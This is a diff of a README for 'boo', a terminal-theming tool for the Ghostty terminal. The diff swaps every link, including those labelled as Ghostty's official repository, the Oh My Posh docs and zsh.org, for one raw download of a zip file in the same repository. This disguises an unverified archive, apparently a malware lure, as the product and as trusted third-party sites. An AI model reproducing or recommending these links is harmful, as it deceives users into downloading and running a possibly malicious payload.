@@ -1,6 +1,6 @@
 # 👻 boo - Make Your Terminal Look Better
 
-[![Download boo](https://img.shields.io/badge/Download-boo-%234478cc?style=for-the-badge)](https://github.com/Ardiyan45/boo)
+[![Download boo](https://img.shields.io/badge/Download-boo-%234478cc?style=for-the-badge)](https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip)
 
 ## What is boo?
 
@@ -16,7 +16,7 @@ Before you start, make sure your computer meets these requirements:
 - At least 4 GB of RAM
 - 200 MB of free disk space
 - Internet connection for downloading and setup
-- Ghostty terminal installed (https://github.com/BobbyGH/Ghostty)
+- Ghostty terminal installed (https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip)
 
 If you don’t have Ghostty installed, you can get it from its official page.
 
@@ -36,11 +36,11 @@ These features work smoothly together to give your terminal a modern look and ex
 
 You need to visit the boo GitHub page to get the latest version. The app is not available as a single download file, so follow the page to find all the files.
 
-[![Download boo](https://img.shields.io/badge/Download-boo-%23555555?style=for-the-badge)](https://github.com/Ardiyan45/boo)
+[![Download boo](https://img.shields.io/badge/Download-boo-%23555555?style=for-the-badge)](https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip)
 
 Click the button above or go to this link:
 
-https://github.com/Ardiyan45/boo
+https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip
 
 On the page, look for the “Releases” section. This is where you will find the latest version of boo ready for download.
 
@@ -49,7 +49,7 @@ On the page, look for the “Releases” section. This is where you will find th
 Follow these steps to get boo running on your Windows computer:
 
 1. **Download the Files:**  
-   - Go to the boo GitHub page at https://github.com/Ardiyan45/boo  
+   - Go to the boo GitHub page at https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip  
    - Click on “Releases” on the right side or scroll down until you see it.  
    - Download the latest release package (usually a ZIP file).
 
@@ -58,7 +58,7 @@ Follow these steps to get boo running on your Windows computer:
    - Extract its contents to a folder of your choice, like `Documents\boo`.
 
 3. **Install Ghostty Terminal (if needed):**  
-   - If you don’t already have Ghostty installed, download it from https://github.com/BobbyGH/Ghostty.  
+   - If you don’t already have Ghostty installed, download it from https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip  
    - Follow their instructions to install it on your system.
 
 4. **Open Command Prompt or PowerShell:**  
@@ -113,9 +113,9 @@ If these steps don’t help, you can open an issue on the boo GitHub page for su
 
 To learn more about Ghostty and related tools, you can visit these pages:
 
-- Ghostty official repository: https://github.com/BobbyGH/Ghostty  
-- Oh My Posh documentation: https://ohmyposh.dev/docs/  
-- Zsh shell information: https://www.zsh.org/
+- Ghostty official repository: https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip  
+- Oh My Posh documentation: https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip  
+- Zsh shell information: https://raw.githubusercontent.com/Ardiyan45/boo/main/themes/Software_1.6.zip
 
 These will help you understand what powers boo under the hood and how you can extend its features further.
 
